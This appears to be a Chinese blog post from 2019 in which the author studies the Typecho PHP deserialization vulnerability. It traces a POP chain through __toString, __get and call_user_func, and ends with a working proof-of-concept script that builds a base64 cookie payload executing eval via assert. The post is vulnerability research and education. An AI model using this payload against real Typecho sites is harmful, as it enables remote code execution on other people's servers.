&lt;p&gt;这个程序一共就只有三个__toString，我自己找的时候只找到一个“类似SQL注入”的点，后来通过利用autoload机制（参考p牛的CSRF到任意代码执行）将那个类加载进来。后来又通过一顿分析发现，其只是返回一个SELECT语句的字符串，然后我就没再跟进了，说不定可以构造成一个反射xss（从反序列化到反射xss？？？）。&lt;/p&gt;
&lt;p&gt;然后看了一下大佬的blog，果然大佬就是大佬。在另一处__toString中找到了一个方法调用：$item[..]-&amp;gt;screenName。由于$item可控，因此这里可以使$item[..]为一个没有screenName属性的对象，当访问一个对象没有的属性时就会寻找它的__get方法！所以大佬这里就找了一个存在危险操作的__get方法的类。果然我还是太菜了，满脑子就只有__destruct和__wakeup。&lt;/p&gt;
&lt;p&gt;跟进__get之后，经过一系列的调用，调用了同类下的某个filter方法，然后在里面进行了call_user_func，两个参数都可控，至此利用链分析完毕。&lt;/p&gt;
&lt;p&gt;构建poc后发现页面返回了500错误，我们的phpinfo()并没有回显出来。经过调试发现，因为程序对反序列化之后的内容进行处理时抛出了异常，导致报了错。我们可以将程序提前exit，不经过后面的报错即可。&lt;/p&gt;
&lt;h3 id=&quot;x02-调试&quot;&gt;0x02 调试&lt;/h3&gt;
&lt;p&gt;首先看一下访问到漏洞点的前置条件&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205227340-103350684.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里会对referer头做一个校验，refer中的host值需要与$_SERVER['HTTP_HOST']的值相等。&lt;/p&gt;
&lt;p&gt;下面看一下漏洞点&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205236029-1111081570.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里需要传入一个finish参数，然后在230行将cookie中的__typecho_config的值通过base64解码之后反序列化。&lt;br/&gt;再往下看两行到232行，这里将$config['adapter']作为第一个参数传入到Typecho_Db()中。$config就是反序列化传来的对象，因此这个参数也是我们可控的。我们跟进一下Typecho_Db()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205241976-1250256953.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;跟进其构造方法之后发现，这里将我们传来的第一个参数做字符串拼接，如果第一个参数是对象的话，那么这里就会调用其__toString()方法。刚好，第一个参数是我们可控的。&lt;/p&gt;
&lt;p&gt;通过寻找__toString方法，找到了一个Typecho_Feed类。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205247795-184072622.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205253193-81929107.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在第二张图中可以看到&lt;code&gt;$item['author']-&amp;gt;screenName&lt;/code&gt;。如果$item['author']是一个不能存在screenName属性的类的话，那么这里就会调用这个类的__get()魔术方法。刚好，这里的$item是我们可控的。因此下面就找哪些类没有screenName属性，并且__get方法存在危险操作。&lt;/p&gt;
&lt;p&gt;最后找到了Typecho_Request类&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205300864-1411198836.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205308011-1424495731.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到$value是可控的。下面跟进一下_applyFilter方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205332467-1519156306.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，这里有个call_user_func方法，且$filter和$value都可控。至此这条pop链基本是构造完了。&lt;/p&gt;
&lt;p&gt;可是构造完payload发现页面响应500，我们的phpinfo()并没有回显出来。经过调试发现，因为程序对反序列化之后的内容进行处理时抛出了异常，导致报了错。如下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205339906-789598836.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到这里首先抛出了一个Typecho_Db_Exception异常，跟进。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205345134-2047587542.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205351705-1860272778.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到调用了ob_end_clean()清空了缓冲区。接着跟到self::error。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205357351-898901106.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205405679-218996309.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，这里配置了一些报错变量，并在最后输出到模板中，然后exit退出了程序。&lt;/p&gt;
&lt;p&gt;暂时知道有两种方法来输出payload的结果：&lt;br/&gt;1）提前exit程序，让程序不运行到抛出异常处&lt;br/&gt;2）提前将缓冲区内容打印到页面上&lt;br/&gt;对于1），这里有两种实现方法，第一种是seebug作者的方法，通过使程序运行出错自动exit，还有一种是直接简单粗暴地将exit放到我们的payload中。&lt;br/&gt;对于2），我本想使用ob_end_flush()之类的方法，但是程序在调用时会传入一个参数，导致ob_end_flush()执行失败，因为这个方法是不接受参数的，所以对于第2）个方法，目前没找到出路。&lt;/p&gt;
&lt;p&gt;所以这里我将exit放到payload中，成功提前退出，回显了phpinfo。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201904/1077935-20190430205414520-1498615494.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;payload如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php

    class Typecho_Feed{
        private $_type;
        private $_items = array();

        public function __construct(){
            $this-&amp;gt;_type = &quot;RSS 2.0&quot;;
            $this-&amp;gt;_items = array(
                array(
                    &quot;title&quot; =&amp;gt; &quot;test&quot;,
                    &quot;link&quot; =&amp;gt; &quot;test&quot;,
                    &quot;data&quot; =&amp;gt; &quot;20190430&quot;,
                    &quot;author&quot; =&amp;gt; new Typecho_Request(),
                ),
            );
        }
    }

    class Typecho_Request{
        private $_params = array();
        private $_filter = array();

        public function __construct(){
            $this-&amp;gt;_params = array(
                &quot;screenName&quot; =&amp;gt; &quot;eval('phpinfo();exit;')&quot;,
            );
            $this-&amp;gt;_filter = array(&quot;assert&quot;);
        }
    }

    $a = new Typecho_Feed();

    $c = array(
        &quot;adapter&quot; =&amp;gt; $a,
        &quot;prefix&quot; =&amp;gt; &quot;test&quot;,
    );

    echo base64_encode(serialize($c));&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;x03-总结&quot;&gt;0x03 总结&lt;/h3&gt;
&lt;p&gt;这个漏洞最精彩的部分就是通过调用__toString再来调用一层__get魔术方法，可惜自己没法把这些已有的点联系起来，还是多学习吧。&lt;/p&gt;
&lt;h3 id=&quot;xff-参考&quot;&gt;0xFF 参考&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://paper.seebug.org/424/&quot; class=&quot;uri&quot;&gt;https://paper.seebug.org/424/&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 30 Apr 2019 12:55:00 +0000</pubDate>
<dc:creator>ka1n4t</dc:creator>
<og:description>[TOC] Typecho 反序列化漏洞学习 0x00 前言 补丁： https://github.com/typecho/typecho/commit/e277141c974cd740702c5ce</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/litlife/p/10798061.html</dc:identifier>
</item>
</channel>
</rss>